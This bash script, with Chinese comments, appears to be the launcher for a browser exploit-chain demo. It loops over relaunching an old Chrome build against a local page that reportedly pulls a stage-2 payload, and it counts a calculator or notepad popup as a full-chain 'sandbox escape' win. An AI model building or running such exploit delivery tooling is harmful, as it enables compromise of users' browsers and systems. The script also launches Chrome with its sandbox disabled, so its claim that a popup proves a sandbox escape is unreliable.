#!/bin/bash
# run_chain.sh — 一键全链演示（v4）：循环直到 calc/notepad 弹出 = OS 沙箱逃逸
# 依赖: 目标 chrome（默认 C:\pwn\chrome54\chrome-win64\chrome.exe，可用环境变量
#       CHROME_EXE=/path/to/chrome.exe 覆盖）；stage-2 由 curl 同源自动拉取，零本地预置
PKG="$(cd "$(dirname "$0")" && pwd)"
cd "$PKG"
mkdir -p tmp
WPKG=$(cygpath -w "$PKG")   # C:\style 路径，防混斜杠
CHROME=$(cygpath -w "${CHROME_EXE:-C:\\pwn\\chrome54\\chrome-win64\\chrome.exe}")
N=${1:-60}; T0=$(date +%s)
# 自包含：runner 没跑就自动拉起（重启后一条命令即可）
PORT=""
if [ -f "port.txt" ]; then P0=$(cat "port.txt"); curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$P0/run_w4.html" && PORT=$P0; fi
if [ -z "$PORT" ]; then
  taskkill //IM runner.exe //F >/dev/null 2>&1; sleep 1
  rm -f "port.txt"
  "$PKG/runner.exe" --nolaunch >/dev/null 2>&1 &
  for w in 1 2 3 4 5; do sleep 1; [ -f "port.txt" ] && break; done
  PORT=$(cat "port.txt" 2>/dev/null || echo 8765)
fi
echo "[chain] http://127.0.0.1:$PORT/ 服务就绪"
for i in $(seq 1 $N); do
  taskkill //IM ms64.exe //F >/dev/null 2>&1; taskkill //IM chrome.exe //F >/dev/null 2>&1; taskkill //IM crashpad_oob.exe //F >/dev/null 2>&1; taskkill //IM CalculatorApp.exe //F >/dev/null 2>&1; taskkill //IM notepad.exe //F >/dev/null 2>&1; sleep 1
  L=tmp/cl_W_$i.log; rm -f "$L" 2>/dev/null
  LOGF="$WPKG\\tmp\\cl_W_$i.log"
  powershell.exe -NoProfile -Command "Start-Process '$CHROME' -ArgumentList ('--user-data-dir=$WPKG\\tmp\\tCH$i','--no-first-run','--no-default-browser-check','--no-sandbox','--disable-features=RendererCodeIntegrity','--enable-logging','--log-file=$LOGF','http://127.0.0.1:$PORT/run_w4.html')" 2>/dev/null
  DEP=0
  for w in $(seq 1 8); do
    sleep 3
    tasklist 2>/dev/null | grep -qiE "CalculatorApp|notepad" && break
    grep -aq "DEPLOYED" "$L" 2>/dev/null && { DEP=1; break; }
    [ -n "$(grep -a FAIL "$L" 2>/dev/null | head -1)" ] && break
  done
  if tasklist 2>/dev/null | grep -qiE "CalculatorApp|notepad"; then
    echo "=== FULL-CHAIN WIN round$i ($(( $(date +%s)-T0 ))s) — calc/notepad 已弹出 ==="; exit 0
  fi
  [ "$DEP" -eq 0 ] && { echo "round$i fail-fast"; continue; }
  for t in $(seq 1 12); do
    sleep 4
    tasklist 2>/dev/null | grep -qiE "CalculatorApp|notepad" && { echo "=== FULL-CHAIN WIN round$i ($(( $(date +%s)-T0 ))s) ==="; exit 0; }
  done
  echo "round$i dep-miss"
done
echo "no win in $N rounds"
